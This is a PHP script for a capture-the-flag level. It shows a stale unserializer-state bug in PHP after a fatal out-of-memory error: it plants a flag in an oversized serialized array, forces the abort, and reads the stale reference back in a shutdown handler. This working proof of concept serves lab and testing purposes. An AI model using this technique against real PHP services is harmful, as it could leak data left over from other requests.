<?php
/*
 * php2shell CTF - Level 2: stale global state after a fatal OOM
 *
 * The bug (CVE-2026-109618 / CVE-2026-109619 family):
 *   A fatal out-of-memory error during unserialize() tears down the request
 *   heap but leaves BG(unserialize) (Zend's unserializer bookkeeping, the
 *   "var_hash" table) published. A later unserialize() in the same worker
 *   nests into that stale table instead of starting from id 1.
 *
 * On 8.5.11 the shutdown-time call below resolves R:1 into the *previous*
 * array whose unserialize() aborted, so it prints that whole array.
 * On 8.5.12 the delayed-OOM cleanup resets BG(unserialize); R:1 now means
 * "this array", so var_dump() prints *RECURSION*.
 *
 * The flag is placed at index 0 of the array that aborts. Only the stale-state
 * bug puts it into the shutdown-time dump, so this script reveals the flag on
 * a vulnerable build and refuses on a patched one.
 */

$flag = trim(file_get_contents(__DIR__ . '/../flags/flag2.txt'));
$n = 40000;

$ser = 'a:' . $n . ':{';
$ser .= 'i:0;s:' . strlen($flag) . ':"' . $flag . '";';
for ($i = 1; $i < $n; $i++) {
    $ser .= 'i:' . $i . ';a:1:{i:0;i:0;}';
}
$ser .= '}';

register_shutdown_function(function () use ($flag) {
    /* If BG(unserialize) is stale, R:1 resolves to the aborted outer array,
     * so $r[0] is that array and $r[0][0] is the flag we planted at index 0.
     * If it was cleaned up, R:1 is a self-reference, so $r[0][0] is an array. */
    $r = unserialize('a:1:{i:0;R:1;}');

    echo "shutdown nested unserialize: ";
    if (is_array($r) && isset($r[0]) && is_array($r[0]) && ($r[0][0] ?? null) === $flag) {
        echo "resolved into stale BG(unserialize) state\n";
        echo "FLAG-2: $flag\n";
    } else {
        echo "clean state (patched behaviour)\n";
        echo "no flag: BG(unserialize) was reset after the fatal error\n";
    }
});

unserialize($ser);
echo "not reached\n";
